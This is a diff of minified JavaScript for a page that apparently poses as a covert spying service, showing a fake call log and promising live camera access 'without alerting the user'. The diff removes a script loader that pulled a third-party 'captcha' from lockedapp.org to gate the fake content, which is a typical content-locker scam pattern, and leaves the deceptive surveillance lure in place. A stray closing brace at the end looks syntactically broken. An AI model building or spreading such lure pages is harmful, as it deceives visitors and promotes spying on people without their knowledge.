@@ -544,6 +544,7 @@ const S = [{
                             case "HR":
                             case "RS":
                             case "SI":
+                            case "SK":
                             case "LT":
                             case "LV":
                             case "EE":
@@ -937,35 +938,7 @@ const S = [{
             })
         })
     };
-let F = null,
-    L = !1;
-const I = () => {
-    if (L && window.TaskPassCaptcha) {
-        return document.querySelectorAll('[data-captcha-enable="true"]').forEach((e => {
-            var s;
-            null == (s = window.TaskPassCaptcha) || s.render(e)
-        })), Promise.resolve()
-    }
-    if (F) return F;
-    const e = document.querySelector('script[data-taskpass-script="true"]');
-    return e && e.remove(), F = new Promise((e => {
-        const s = document.createElement("script");
-        s.src = "https://lockedapp.org/cp/js/8wpen", s.async = !0, s.defer = !0, s.setAttribute("data-taskpass-script", "true"), s.onload = () => {
-            setTimeout((() => {
-                if (window.TaskPassCaptcha) {
-                    document.querySelectorAll('[data-captcha-enable="true"]').forEach((e => {
-                        var s;
-                        null == (s = window.TaskPassCaptcha) || s.render(e)
-                    }))
-                }
-                L = !0, F = null, e()
-            }), 100)
-        }, s.onerror = () => {
-            console.error("Failed to load TaskPass script"), L = !1, F = null, e()
-        }, document.head.appendChild(s)
-    })), F
-},
-    R = [{
+const R = [{
         name: "Anthony (brother) Tyler",
         type: "ISpyFace Video",
         time: "5:41 AM",
@@ -1060,22 +1033,6 @@ const I = () => {
                         })]
                     })]
                 }, s)))
-            }), $.jsxs("div", {
-                className: "absolute inset-0 bg-black/90 backdrop-blur-sm flex flex-col items-center justify-center p-6",
-                children: [$.jsxs("div", {
-                    className: "text-center mb-6",
-                    children: [$.jsx("h3", {
-                        className: "text-xl font-semibold text-white mb-2",
-                        children: "Complete captcha to continue"
-                    }), $.jsx("p", {
-                        className: "text-sm text-gray-400",
-                        children: "Verification required to access call history"
-                    })]
-                }), $.jsx("div", {
-                    "data-captcha-enable": "true",
-                    "data-captcha-id": "history",
-                    className: "captcha-container"
-                })]
             })]
         })]
     }) : null,
@@ -1087,7 +1044,7 @@ const I = () => {
         return e.useEffect((() => {
             if (!s) return void i(!1);
             const e = setTimeout((() => {
-                i(!0), I()
+                i(!0)
             }), 4e3);
             return () => clearTimeout(e)
         }), [s]), s ? $.jsxs("div", {
@@ -1166,29 +1123,25 @@ const I = () => {
                 }), l && $.jsxs("div", {
                     className: "absolute inset-0 bg-black/90 backdrop-blur-sm flex flex-col items-center justify-center p-6 fade-in",
                     children: [$.jsx("div", {
-                        className: "w-14 h-14 bg-yellow-500/10 rounded-full flex items-center justify-center mx-auto mb-4",
+                        className: "w-14 h-14 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-4",
                         children: $.jsx(m, {
-                            className: "w-7 h-7 text-yellow-500"
+                            className: "w-7 h-7 text-red-500"
                         })
                     }), $.jsxs("div", {
                         className: "text-center mb-6",
                         children: [$.jsx("h3", {
                             className: "text-xl font-semibold text-white mb-2",
-                            children: "Live Camera Access"
+                            children: "Verification Required"
                         }), $.jsx("p", {
                             className: "text-sm text-gray-400",
-                            children: "Complete verification to access the live camera feed without alerting the user"
+                            children: "Please complete a quick verification to access the live camera feed."
                         })]
-                    }), $.jsx("div", {
-                        className: "w-full max-w-[300px] mx-auto bg-black/50 rounded-lg p-4 mb-4",
-                        children: $.jsx("div", {
-                            "data-captcha-enable": "true",
-                            "data-captcha-id": "live",
-                            className: "captcha-container"
-                        })
-                    }), $.jsx("p", {
-                        className: "text-xs text-yellow-500/80 text-center",
-                        children: "System may trigger alert if session is left incomplete"
+                    }), $.jsx("a", {
+                        href: "https://www.google.com",
+                        target: "_blank",
+                        rel: "noopener noreferrer",
+                        className: "w-full max-w-xs h-12 rounded-xl bg-[#FF3B30] text-white font-medium hover:bg-[#FF3B30]/90 transition-colors flex items-center justify-center",
+                        children: "Complete Verification (Google)"
                     })]
                 })]
             })]
@@ -1200,11 +1153,7 @@ const I = () => {
     }) => {
         const [t, l] = e.useState(!1),
             [i, c] = e.useState(!1);
-        return e.useEffect((() => {
-            (t || i) && setTimeout((() => {
-                I()
-            }), 300)
-        }), [t, i]), $.jsxs("div", {
+        return $.jsxs("div", {
             className: "w-full h-[100dvh] fixed inset-0 bg-black fade-in",
             children: [$.jsxs("div", {
                 className: "relative w-full h-full",
@@ -1430,3 +1379,4 @@ function _() {
 w(document.getElementById("root")).render($.jsx(e.StrictMode, {
     children: $.jsx(_, {})
 }));
+}
